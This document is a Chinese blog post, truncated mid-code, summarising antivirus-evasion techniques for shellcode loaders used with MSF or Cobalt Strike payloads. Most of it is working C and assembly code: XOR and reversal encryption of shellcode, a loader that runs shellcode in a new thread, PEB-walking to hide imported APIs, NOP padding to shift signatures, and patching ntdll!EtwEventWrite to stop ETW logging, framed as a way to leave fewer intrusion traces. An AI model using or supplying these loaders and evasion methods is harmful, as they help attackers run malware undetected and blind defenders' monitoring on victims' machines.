        <content type="html"><![CDATA[<p>在我初学免杀时，也自己手动实现了一个程序，不过还是没有逃过杀毒软件的识别😀。今天就先来总结一下已经学习过的知识，避免忘记。</p><span id="more"></span><h2 id="大致了解"><a href="#大致了解" class="headerlink" title="大致了解"></a>大致了解</h2><p>首先做免杀是为了什么，肯定是我们想让我们的木马可以运行而且不被杀软识别。我们的木马是什么？就是我们使用MSF或者CS生成的shellcode，那么就引进来了一个重要概念：shellcode。</p><p>这里就不过多介绍生成shellcode的工具了，已经有很多教程详细介绍了如何使用，生成shellcode后，还需要一个shellcodeloader，用来加载shellcode，不然单指望一个shellcode就可以到达我们远程控制的目的，实在是有些小看各大安全厂商所付出的努力了。这里就又绕回到免杀上来了，我们的shellcodeloader如何才能不被各家安全厂商的识别为木马程序，就是我们学习的重点。</p><p>总结一下这一部分的重点：<strong>shellcode的生成</strong>、<strong>shellcodeloader的免杀</strong>。</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>俗话说知己知彼，百战百胜。我们只有知道各大安全厂商是如何大致检测木马程序，才能有针对的进行绕过。</p><h3 id="基于特征码的扫描"><a href="#基于特征码的扫描" class="headerlink" title="基于特征码的扫描"></a>基于特征码的扫描</h3><p>这个不难理解，对文件或内存中的存在的特征做检测，像字符串或者高危API函数。检测方法是做模糊哈希或者机器学习跑模型，内部应该是一种累计计数方式为程序进行检测，等危险函数或字符串累积到一定阈值，就报警。这种方法准确度很高，但是很难针对未知的木马。</p><h3 id="关联检测"><a href="#关联检测" class="headerlink" title="关联检测"></a>关联检测</h3><p>这个就很难说明白了。有可能检测shellcode的特征，或者也可能是一组关联的代码，把一组关联信息作为特征。按照我的理解来说，这个关联特征应该与shellcode的加载有关，比如使用远程线程加载技术时，就不可避免的使用一些API函数，当这些API函数单独出现不会报警，但要是一起出现就可能被当作木马。</p><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>我觉得沙箱应该和行为检测是一种类型。启动一个虚拟环境给疑似木马的程序运行，提供它可能用到的一切元素，包括硬盘，端口等，让它在其上自由发挥，最后根据其行为来判定是否为病毒。主要针对的就是变形木马。</p><h2 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h2><p>针对上述检测方法，有许多大佬孜孜不倦的开发出了许多方法进行绕过。本人也不过在这里拾人牙慧，略做总结。</p><h3 id="针对特征码检测"><a href="#针对特征码检测" class="headerlink" title="针对特征码检测"></a>针对特征码检测</h3><h4 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h4><p>既然你可以在文件中通过我的shellcode和硬编码的字符串检测到我，那么我就变形，消除特征。具体操作就是对shellcode和硬编码字符串进行异或、编码或者加密，等我到内存中自解密，不影响程序正常执行。但是要注意加密操作可能影响文件信息熵的增加，笔者曾经在某位大佬的博客中见到有些杀软会检测信息熵的大小，如果过高也会定义为木马程序。</p><p>代码实现（vs2017）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">//你的shellcode</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">xorcode</span><span class="params">(<span class="type">char</span> *shellBuffer, <span class="type">int</span> nlength, <span class="type">int</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nlength; i++)</span><br><span class="line">&#123;</span><br><span class="line">shellBuffer[i] ^= key;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recode</span><span class="params">(<span class="type">char</span>*szBuffer, <span class="type">int</span> nLength)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *szTemp = new <span class="type">char</span>[nLength] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> count = nLength - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">szTemp[count - i] = szBuffer[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt;=count; i++)</span><br><span class="line">szBuffer[i]=szTemp[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WriteToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*szPath, <span class="type">char</span>*szBuffer, <span class="type">int</span> nLength)</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hFile = CreateFileA(szPath, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">DWORD lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">BOOL bRet = WriteFile(hFile, szBuffer, nLength, &amp;lpNumberOfBytesWritten, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WriteFile Success!&quot;</span> &lt;&lt; <span class="built_in">std</span> ::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WriteFile Failed!&quot;</span> &lt;&lt; <span class="built_in">std</span> :: <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">recode((<span class="type">char</span>*)&amp;shellcode, <span class="keyword">sizeof</span>(shellcode));<span class="comment">//将shellcode倒叙</span></span><br><span class="line">xorcode((<span class="type">char</span>*)&amp;shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="number">0x75</span>);<span class="comment">//异或shellcode</span></span><br><span class="line">WriteToFile(<span class="string">&quot;D:\\shellcode.ini&quot;</span>, (<span class="type">char</span>*)&amp;shellcode, <span class="keyword">sizeof</span>(shellcode));<span class="comment">//将shellcode写入shellcode.ini中</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//W-------------------------------------我是分割线--------------------------------------W</span></span><br><span class="line"></span><br><span class="line">这段代码是对应的shellcodeloader程序的main函数，先解密，再在当前进程分配内存空间，写入shellcoed，接着创建一个线程，起始地址为分配空间的地址，执行shellcode</span><br><span class="line"><span class="comment">//int main()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//xorcode((char*)&amp;shellcode, sizeof(shellcode), 0x75);</span></span><br><span class="line"><span class="comment">//recode((char*)&amp;shellcode, sizeof(shellcode));</span></span><br><span class="line"><span class="comment">//LPVOID lpBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line"><span class="comment">//SIZE_T  lpNumberOfBytesWritten = 0;</span></span><br><span class="line"><span class="comment">//WriteProcessMemory(GetCurrentProcess(), lpBuffer, shellcode, sizeof(shellcode), &amp;lpNumberOfBytesWritten);</span></span><br><span class="line"><span class="comment">//HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);</span></span><br><span class="line"><span class="comment">//if (hThread != NULL) &#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;success&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else &#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;error&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//WaitForSingleObject(hThread, INFINITE);</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过上述代码就可以将你的shellcode进行简单加密，当在shellcodeloader中加载shellcode的时候也要先解密再运行。</p><h4 id="shellcode分离"><a href="#shellcode分离" class="headerlink" title="shellcode分离"></a>shellcode分离</h4><p>这种思路是你既然从程序中检测到我的shellcode，那么我就不把shellcode写进程序中，而是通过网络连接远程读取程序获取sehllcode，再执行shellcode。由于笔者没有马内买不起服务器，所以暂时没有实现shellcode分离的代码。</p><h4 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h4><p>一些加壳软件对程序加壳后，基本可以实现特征码的覆盖。这里指的加壳软件是加密壳，本质还是对shellcode进行加密来隐藏特征。这里笔者也没有做过尝试，是理论可行的范围。</p><h3 id="针对关联检测"><a href="#针对关联检测" class="headerlink" title="针对关联检测"></a>针对关联检测</h3><h4 id="隐藏IAT"><a href="#隐藏IAT" class="headerlink" title="隐藏IAT"></a>隐藏IAT</h4><p>当我们调用API时可以在导入表中明显看到，这对于木马编写者来说肯定是一大败笔，因为反病毒人员很轻松就能看到你有没有调用可疑函数进行一连串的操作，那么我们就要隐藏我们的导入函数。</p><p>代码实现（vs2017）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32.dll 的基址</span></span><br><span class="line">DWORD <span class="title function_">GetKernel32Address</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// 使用汇编获取 TEB 和 PEB 结构，从而获取 Kernel32.dll 的基址</span></span><br><span class="line">DWORD dwKernel32Addr = <span class="number">0</span>;</span><br><span class="line">_asm &#123;</span><br><span class="line">push eax</span><br><span class="line">mov eax, dword ptr fs:[<span class="number">0x30</span>]</span><br><span class="line">mov eax, [eax + <span class="number">0x0c</span>]</span><br><span class="line">mov eax, [eax + <span class="number">0x1C</span>]</span><br><span class="line">mov eax, [eax]</span><br><span class="line">mov eax, [eax + <span class="number">0x08</span>]</span><br><span class="line">mov dwKernel32Addr, eax</span><br><span class="line">pop eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dwKernel32Addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyGetProcAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwAddrBase =GetKernel32Address();<span class="comment">// 获取 Kernel32.dll 的基址</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos=(PIMAGE_DOS_HEADER)dwAddrBase;<span class="comment">// 转换为 DOS 头指针</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt=(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew +dwAddrBase);<span class="comment">// 转换为 NT 头指针</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDataDir= pNt-&gt;OptionalHeader.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT;<span class="comment">// 获取导出表数据目录</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport=(PIMAGE_EXPORT_DIRECTORY)(dwAddrBase+pDataDir-&gt;VirtualAddress);<span class="comment">// 获取导出表</span></span><br><span class="line">DWORD dwFunCount= pExport-&gt;NumberOfFunctions;<span class="comment">// 导出函数表数量</span></span><br><span class="line">DWORD dwFunNameCount =pExport-&gt;NumberOfNames;<span class="comment">// 导出函数名数量</span></span><br><span class="line">PDWORD pAddrOfFun=(PDWORD)(pExport-&gt;AddressOfFunctions+dwAddrBase);<span class="comment">// 函数地址表指针</span></span><br><span class="line">PDWORD pAddrOfNames=(PDWORD)(pExport-&gt;AddressOfNames+dwAddrBase);<span class="comment">// 函数名表指针</span></span><br><span class="line">PWORD pAddrOfOrdinals=(PWORD)(pExport-&gt;AddressOfNameOrdinals+dwAddrBase);<span class="comment">// 序号表指针</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i&lt; dwFunCount; i++)<span class="comment">// 遍历导出函数表</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!pAddrOfFun[i])<span class="comment">// 如果函数地址为0，跳过</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">DWORD dwFunAddrOffset =pAddrOfFun[i];<span class="comment">// 获取当前函数地址偏移</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; dwFunNameCount; j++)<span class="comment">// 遍历导出函数名表</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pAddrOfOrdinals[j] == i)<span class="comment">// 如果序号表中的序号等于当前索引</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwNameOffset = pAddrOfNames[j];<span class="comment">// 获取函数名偏移</span></span><br><span class="line"><span class="type">char</span> *pFuncName = (<span class="type">char</span> *)(dwAddrBase + dwNameOffset);<span class="comment">// 获取函数名地址</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(pFuncName, <span class="string">&quot;GetProcAddress&quot;</span>) == <span class="number">0</span>)<span class="comment">// 如果函数名匹配 GetProcAddress</span></span><br><span class="line"><span class="keyword">return</span> dwFunAddrOffset + dwAddrBase;<span class="comment">// 返回 GetProcAddress 地址</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义函数指针类型</span></span><br><span class="line"><span class="comment">//LoadLibrary</span></span><br><span class="line">EXTERN_C <span class="keyword">typedef</span> <span class="title function_">HMODULE</span></span><br><span class="line"><span class="params">(WINAPI</span></span><br><span class="line"><span class="params">*fnLoadLibraryA)</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ LPCSTR lpLibFileName)</span>;</span><br><span class="line"><span class="comment">//GetProcAddress</span></span><br><span class="line">EXTERN_C <span class="keyword">typedef</span> WINBASEAPI</span><br><span class="line"><span class="title function_">FARPROC</span></span><br><span class="line"><span class="params">(WINAPI</span></span><br><span class="line"><span class="params">*fnGetProcAddress)</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HMODULE hModule,</span></span><br><span class="line"><span class="params">_In_ LPCSTR lpProcName)</span>;</span><br><span class="line"><span class="comment">//MessageBoxA</span></span><br><span class="line">EXTERN_C <span class="keyword">typedef</span> <span class="title function_">int</span></span><br><span class="line"><span class="params">(WINAPI *</span></span><br><span class="line"><span class="params">fnMessageBoxA)</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_opt_ HWND hWnd,</span></span><br><span class="line"><span class="params">_In_opt_ LPCSTR lpText,</span></span><br><span class="line"><span class="params">_In_opt_ LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">_In_ UINT uType)</span>;</span><br><span class="line"><span class="comment">//ExitProcess</span></span><br><span class="line">EXTERN_C <span class="keyword">typedef</span> <span class="title function_">VOID</span></span><br><span class="line"><span class="params">(WINAPI</span></span><br><span class="line"><span class="params">*fnExitProcess)</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ UINT uExitCode)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取 自定义实现的 MyGetProcAddress 函数地址</span></span><br><span class="line">fnGetProcAddress pfnGetProcAddress = (fnGetProcAddress)MyGetProcAddress();</span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll 的基址</span></span><br><span class="line">HMODULE hKernel32 = (HMODULE)GetKernel32Address();</span><br><span class="line">    <span class="comment">// 通过 GetProcAddress 获取 LoadLibraryA 函数的地址，并加载 user32.dll</span></span><br><span class="line">fnLoadLibraryA pfnLoadLibraryA=(fnLoadLibraryA)pfnGetProcAddress(hKernel32, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">HMODULE hUser32 = (HMODULE)pfnLoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">     <span class="comment">// 通过 GetProcAddress 获取 MessageBoxA 函数的地址，并调用该函数</span></span><br><span class="line">fnMessageBoxA pfnMessageBoxA=(fnMessageBoxA)pfnGetProcAddress(hUser32, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">pfnMessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;success&quot;</span>, <span class="string">&quot;Msg&quot;</span>, MB_OK);</span><br><span class="line">    <span class="comment">// 通过 GetProcAddress 获取 ExitProcess 函数的地址，并调用该函数</span></span><br><span class="line">fnExitProcess pfnExitProcess=(fnExitProcess)pfnGetProcAddress(hKernel32, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">pfnExitProcess(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/19/1uV94m3JIRWbNkB.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/19/1uV94m3JIRWbNkB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240419195759335"></p><p>这段代码只是一个小demo，通过实现我们自己的GetProcAddress函数，来加载各种API函数，达到绕过导入表的目的。</p><h4 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h4><p>一些厂商在检测特征码时，会存在一个偏移范围，我们只要填充垃圾数据超过这个偏移范围，就可以做到躲避检测的效果。但毕竟是猜测的偏移范围，失败的概率还是不小的。比如我们在上述获取获取 Kernel32.dll 的基址的函数中添加nop，可能会对绕过杀软有帮助</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwKernel32Addr = 0;</span><br><span class="line">_asm &#123;</span><br><span class="line">push eax</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov eax, dword ptr fs:[0x30]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov eax, [eax + 0x0c]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov eax, [eax + 0x1C]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov eax, [eax]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov eax, [eax + 0x08]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">mov dwKernel32Addr, eax</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">pop eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="禁用ETW"><a href="#禁用ETW" class="headerlink" title="禁用ETW"></a>禁用ETW</h4><p>​先来了解一下什么是<a href="https://learn.microsoft.com/zh-cn/windows-hardware/test/weg/instrumenting-your-code-with-etw">ETW</a>。按照我的理解,就是windows提供的事件跟踪日志系统，用于系统和应用诊断、故障排除和性能监视，同样也可以用来监视<a href="https://blog.csdn.net/xf555er/article/details/132416549">execute-assembly</a>等功能的行为操作。那么为了留下更少的入侵痕迹，就可以禁用ETW。</p><p>通过研究<a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/">大佬</a>的博客，<code>ETW</code>将<code>TRUE</code>布尔参数传递到<code>nt!EtwpStopTrace</code>函数中，以查找<code>ETW</code>特定结构并动态修改<code>ntdll!ETWEventWrite</code>立即返回从而停止跟踪日志记录。关键点就是<code>ntdll!ETWEventWrite</code></p><p>先查看产生大量日志的程序是什么样子，以powershell为例</p><p><img src="https://s2.loli.net/2024/04/23/8ba2dTMNCkhfGQg.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/23/8ba2dTMNCkhfGQg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240423211134350"></p><p>接着可以patch <code>ntdll!EtwEventWrite</code>函数来查看是否禁用了ETW。</p><p>在将powershell进程附加到x64dbg中，在<code>ntdll!EtwEventWrite</code>上下断点</p><p><img src="https://s2.loli.net/2024/04/23/fDgqpM4zvnVCFG5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/23/fDgqpM4zvnVCFG5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240423211832469"></p><p>一般windows api默认使用stdcall(x86)调用约定，这里x64默认使用fastcall，即寄存器传参，被调用者清理堆栈，所以我们直接返回（ret）就好。</p><p><img src="https://s2.loli.net/2024/04/23/gOkAUu5eohjlEZQ.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/23/gOkAUu5eohjlEZQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240423212140465"></p><p>之后F9运行,在processhacker中查看日志信息</p><p><img src="https://s2.loli.net/2024/04/23/AbiPXRvtwD51QnB.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/23/AbiPXRvtwD51QnB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240423212404505"></p><p>已经读取不到所有信息。</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">STARTUPINFOA si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//启动一个 PowerShell 进程，并将进程信息保存在 pi 中</span></span><br><span class="line">CreateProcessA(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -NoExit&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取 ntdll.dll 中的 EtwEventWrite 函数的地址</span></span><br><span class="line">HMODULE hNtdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">LPVOID pEtwEventWrite = GetProcAddress(hNtdll, <span class="string">&quot;EtwEventWrite&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sleep(500);</span></span><br><span class="line"></span><br><span class="line">DWORD oldProtect;</span><br><span class="line">    <span class="comment">//ret</span></span><br><span class="line"><span class="type">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将 EtwEventWrite 函数的内存页设置为可读写执行</span></span><br><span class="line">VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//将第一个字节修改为 ret 指令</span></span><br><span class="line">WriteProcessMemory(pi.hProcess, 